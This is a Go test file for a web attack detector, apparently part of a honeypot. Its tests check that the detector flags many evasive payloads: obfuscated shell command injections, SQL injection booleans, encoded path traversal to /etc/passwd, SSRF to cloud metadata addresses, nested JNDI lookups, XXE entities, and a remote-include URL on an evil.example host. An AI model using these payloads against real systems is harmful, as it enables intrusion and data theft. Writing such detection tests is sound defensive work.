package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/binary"
	"net/http"
	"testing"
)

// Build a small multipart body without relying on implementation-specific parsing details
func reviewedMultipartBody(name, value string) (string, string) {
	const boundary = "ghoney-security-boundary"
	body := "--" + boundary + "\r\n" +
		"Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n" +
		value + "\r\n--" + boundary + "--\r\n"
	return body, "multipart/form-data; boundary=" + boundary
}

// Assert the reviewed multipart fields retain enough context for every detector
func TestReviewedMultipartContextBypasses(t *testing.T) {
	tests := []struct {
		name       string
		field      string
		value      string
		attackType string
	}{
		{name: "SSRF field", field: "url", value: "http://169.254.169.254/", attackType: "SSRF"},
		{name: "command field", field: "cmd", value: "whoami", attackType: "Command Injection"},
		{name: "NoSQL field", field: "user[$ne]", value: "guest", attackType: "NoSQL Injection"},
		{name: "remote include field", field: "file", value: "http://evil.example/shell.txt", attackType: "LFI/RFI"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			body, contentType := reviewedMultipartBody(test.field, test.value)
			input := detectionInput{Path: "/", Body: body, Header: http.Header{"Content-Type": []string{contentType}}}
			if detections := detectAttacks(input); !hasDetectionType(detections, test.attackType) {
				t.Fatalf("missing %q detection in %+v", test.attackType, detections)
			}
		})
	}
}

// Cover deep percent encoding, NUL separators and Unicode lookalikes
func TestReviewedCanonicalizationBypasses(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		attackType string
	}{
		{name: "six pass traversal", query: "p=%25252525252e%25252525252e%25252525252fetc%25252525252fpasswd", attackType: "Path Traversal"},
		{name: "NUL traversal", query: "p=..%00/..%00/etc/passwd", attackType: "Path Traversal"},
		{name: "Unicode traversal", query: "p=%E2%80%A4%E2%80%A4%E2%81%84etc/passwd", attackType: "Path Traversal"},
		{name: "NUL SQL", query: "id=1%00OR%001=1", attackType: "SQL Injection"},
		{name: "fullwidth SSRF", query: "url=http://%EF%BC%91%EF%BC%92%EF%BC%97.0.0.1/", attackType: "SSRF"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if detections := detectAttacks(detectionInput{Path: "/", RawQuery: test.query}); !hasDetectionType(detections, test.attackType) {
				t.Fatalf("missing %q detection in %+v", test.attackType, detections)
			}
		})
	}
}

// Cover shell constructs that bypassed the narrower binary signatures
func TestReviewedCommandBypasses(t *testing.T) {
	queries := []string{
		`x=;whoami${IFS%??}`,
		`x=;/???/whoami`,
		`x=;c?t /etc/passwd`,
		`x=;${PATH:0:1}whoami`,
		`x=;$(printf whoami)`,
		`x=;FOO=bar whoami`,
		`x=;wh\oami`,
		`x=;whoami#`,
		`x=;'whoami'`,
		`x=;"whoami"`,
		`x=;whoami$`,
		`x=;(whoami)`,
		`x=;{whoami;}`,
		`x=;if true;then whoami;fi`,
		`x=;while true;do whoami;done`,
		`x=;eval whoami`,
	}
	for _, query := range queries {
		if detections := detectAttacks(detectionInput{Path: "/", RawQuery: query}); !hasDetectionType(detections, "Command Injection") {
			t.Errorf("missing command detection for %q: %+v", query, detections)
		}
	}
	jsonInput := detectionInput{Path: "/", Body: `{"value":"$(printf whoami)"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}
	if detections := detectAttacks(jsonInput); !hasDetectionType(detections, "Command Injection") {
		t.Errorf("missing command substitution detection in JSON: %+v", detections)
	}
}

// Cover boolean SQL operands without requiring a leading quote or whitespace
func TestReviewedSQLBypasses(t *testing.T) {
	queries := []string{
		`u='or(1)=1`,
		`u='or('1')='1`,
		`u=1or(1)=1`,
		`u='and(1)=(1)`,
		`u='or not(1)=2`,
		`u=1 or 'a'=0x61`,
		`u=1 or char(49)=char(49)`,
		`u=1 and case when 1=1 then 1 else 0 end`,
		`u=1 and if(1=1,1,0)`,
		`u=1 having 1=1`,
		`u=1 xor(1)=1`,
		`u=' OR true--`,
		`u=1 OR true`,
		`id=0x4f52=0x4f52`,
	}
	for _, query := range queries {
		if detections := detectAttacks(detectionInput{Path: "/", RawQuery: query}); !hasDetectionType(detections, "SQL Injection") {
			t.Errorf("missing SQL detection for %q: %+v", query, detections)
		}
	}

	jsonBodies := []string{`{"id":"1 or 1=1"}`, `{"id":"1 and 1=1"}`, `{"id":"1 or (1)=1"}`}
	for _, body := range jsonBodies {
		input := detectionInput{Path: "/", Body: body, Header: http.Header{"Content-Type": []string{"application/json"}}}
		if detections := detectAttacks(input); !hasDetectionType(detections, "SQL Injection") {
			t.Errorf("missing JSON SQL detection for %q: %+v", body, detections)
		}
	}
}

// Encode an ASCII fixture as UTF-16 for body inspection tests
func reviewedUTF16(value string, order binary.ByteOrder, bom bool) []byte {
	offset := 0
	if bom {
		offset = 2
	}
	encoded := make([]byte, offset+len(value)*2)
	if bom && order == binary.LittleEndian {
		encoded[0], encoded[1] = 0xff, 0xfe
	} else if bom {
		encoded[0], encoded[1] = 0xfe, 0xff
	}
	for index, current := range []byte(value) {
		order.PutUint16(encoded[offset+index*2:], uint16(current))
	}
	return encoded
}

// Encode an ASCII fixture as UTF-32 for body inspection tests
func reviewedUTF32(value string, order binary.ByteOrder, bom bool) []byte {
	offset := 0
	if bom {
		offset = 4
	}
	encoded := make([]byte, offset+len(value)*4)
	if bom && order == binary.LittleEndian {
		copy(encoded, []byte{0xff, 0xfe, 0x00, 0x00})
	} else if bom {
		copy(encoded, []byte{0x00, 0x00, 0xfe, 0xff})
	}
	for index, current := range []byte(value) {
		order.PutUint32(encoded[offset+index*4:], uint32(current))
	}
	return encoded
}

// Cover nested JNDI, structured XML and Unicode XML sources
func TestReviewedJNDIAndXMLBypasses(t *testing.T) {
	jndiValues := []string{
		`${${env:X:-${lower:j}}}ndi:ldap://example.com/a}`,
		`${${sys:j}ndi:ldap://example.com/a}`,
		`${${date:j}ndi:ldap://example.com/a}`,
		`${${main:j}ndi:ldap://example.com/a}`,
		`${${ctx:j}ndi:ldap://example.com/a}`,
	}
	for _, value := range jndiValues {
		if detections := detectAttacks(detectionInput{Path: "/", RawQuery: "q=" + value}); !hasDetectionType(detections, "JNDI Injection") {
			t.Errorf("missing JNDI detection for %q: %+v", value, detections)
		}
	}

	xml := `<!ENTITY x SYSTEM "file:///etc/passwd">`
	inputs := []struct {
		name  string
		input detectionInput
	}{
		{name: "JSON", input: detectionInput{Path: "/", Body: `{"xml":"<!ENTITY x SYSTEM \"file:///etc/passwd\">"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}},
		{name: "UTF-16 little endian", input: detectionInput{Path: "/", Body: string(reviewedUTF16(xml, binary.LittleEndian, true)), Header: http.Header{"Content-Type": []string{"application/xml"}}}},
		{name: "UTF-16 big endian", input: detectionInput{Path: "/", Body: string(reviewedUTF16(xml, binary.BigEndian, false)), Header: http.Header{"Content-Type": []string{"application/xml"}}}},
		{name: "UTF-32 little endian", input: detectionInput{Path: "/", Body: string(reviewedUTF32(xml, binary.LittleEndian, true)), Header: http.Header{"Content-Type": []string{"application/xml"}}}},
		{name: "UTF-32 big endian", input: detectionInput{Path: "/", Body: string(reviewedUTF32(xml, binary.BigEndian, false)), Header: http.Header{"Content-Type": []string{"application/xml"}}}},
	}
	for _, test := range inputs {
		t.Run(test.name, func(t *testing.T) {
			if detections := detectAttacks(test.input); !hasDetectionType(detections, "XML Entity") {
				t.Errorf("missing XML detection in %+v", detections)
			}
		})
	}
}

// Cover recursive Base64 decoding while keeping unstructured bodies untouched
func TestReviewedRecursiveBase64Bypass(t *testing.T) {
	encoded := "whoami"
	for pass := 0; pass < 3; pass++ {
		encoded = base64.StdEncoding.EncodeToString([]byte(encoded))
	}
	input := detectionInput{Path: "/", RawQuery: "cmd=" + encoded}
	if detections := detectAttacks(input); !hasDetectionType(detections, "Command Injection") {
		t.Fatalf("missing recursive Base64 command detection in %+v", detections)
	}
}

// Cover deeper gzip decoding with the same bounded output size
func TestReviewedNestedGzipBypass(t *testing.T) {
	payload := []byte("../../etc/passwd")
	for layer := 0; layer < 6; layer++ {
		var compressed bytes.Buffer
		writer := gzip.NewWriter(&compressed)
		if _, err := writer.Write(payload); err != nil {
			t.Fatalf("write gzip layer: %v", err)
		}
		if err := writer.Close(); err != nil {
			t.Fatalf("close gzip layer: %v", err)
		}
		payload = compressed.Bytes()
	}
	decoded, err := readBoundedGzipBody(payload)
	if err != nil {
		t.Fatalf("decode nested gzip: %v", err)
	}
	if string(decoded) != "../../etc/passwd" {
		t.Fatalf("decoded body = %q", decoded)
	}
}

// Cover raw security-sensitive headers and broader contextual operators
func TestReviewedHeaderNoSQLAndSSRFBypasses(t *testing.T) {
	tests := []struct {
		name       string
		input      detectionInput
		attackType string
	}{
		{name: "Bearer JNDI", input: detectionInput{Path: "/", Header: http.Header{"Authorization": []string{"Bearer ${jndi:ldap://example.com/a}"}}}, attackType: "JNDI Injection"},
		{name: "Bearer SQL", input: detectionInput{Path: "/", Header: http.Header{"Authorization": []string{"Bearer 1 OR 1=1"}}}, attackType: "SQL Injection"},
		{name: "Content-Type XML", input: detectionInput{Path: "/", Header: http.Header{"Content-Type": []string{`<!ENTITY x SYSTEM "file:///etc/passwd">`}}}, attackType: "XML Entity"},
		{name: "NoSQL jsonSchema", input: detectionInput{Path: "/", RawQuery: "user[$jsonSchema]=x"}, attackType: "NoSQL Injection"},
		{name: "SSRF link", input: detectionInput{Path: "/", RawQuery: "link=http://169.254.169.254/"}, attackType: "SSRF"},
		{name: "SSRF alternate URL", input: detectionInput{Path: "/", RawQuery: "imageurl=http://127.0.0.1/"}, attackType: "SSRF"},
		{name: "SSRF benchmark range", input: detectionInput{Path: "/", RawQuery: "url=http://198.18.0.1/"}, attackType: "SSRF"},
		{name: "SSRF jar scheme", input: detectionInput{Path: "/", RawQuery: "url=jar:http://127.0.0.1/a.jar!/x"}, attackType: "SSRF"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if detections := detectAttacks(test.input); !hasDetectionType(detections, test.attackType) {
				t.Fatalf("missing %q detection in %+v", test.attackType, detections)
			}
		})
	}
}

// Keep representative prose and public targets below the detection threshold
func TestReviewedSignaturesRemainConservative(t *testing.T) {
	inputs := []detectionInput{
		{Path: "/guide", Body: "Use $(name) as a placeholder in this document."},
		{Path: "/guide", Body: "The team is true while the release is stable."},
		{Path: "/", RawQuery: "url=https://example.com/release"},
		{Path: "/", RawQuery: "id=version1or2"},
	}
	for _, input := range inputs {
		if detections := detectAttacks(input); len(detections) != 0 {
			t.Errorf("benign input produced detections: %+v", detections)
		}
	}
}

// Ensure high-volume alerts cannot erase the only medium-confidence signal
func TestDashboardRetainsMediumSignalsDuringHighFlood(t *testing.T) {
	resetRecentLogs(t)
	logEvent("info", "192.0.2.1", "test", "/", "SSRF", "test", "", "", confidenceMedium)
	for index := 0; index < logBufferSize+20; index++ {
		logEvent("warn", "192.0.2.2", "test", "/", "XSS", "test", "", "", confidenceHigh)
	}

	logMutex.Lock()
	defer logMutex.Unlock()
	for _, entry := range recentLogs {
		if entry.AttackType == "SSRF" && entry.Confidence == confidenceMedium {
			return
		}
	}
	t.Fatal("medium-confidence signal was evicted by high-confidence noise")
}

// Keep only numeric loopback literals eligible for passwordless administration
func TestLocalhostNameIsNotLiteralLoopback(t *testing.T) {
	if isLiteralLoopbackAddress("localhost:9090") {
		t.Fatal("localhost hostname was accepted as a literal loopback address")
	}
	for _, address := range []string{"127.0.0.1:9090", "[::1]:9090"} {
		if !isLiteralLoopbackAddress(address) {
			t.Errorf("literal loopback %q was rejected", address)
		}
	}
}
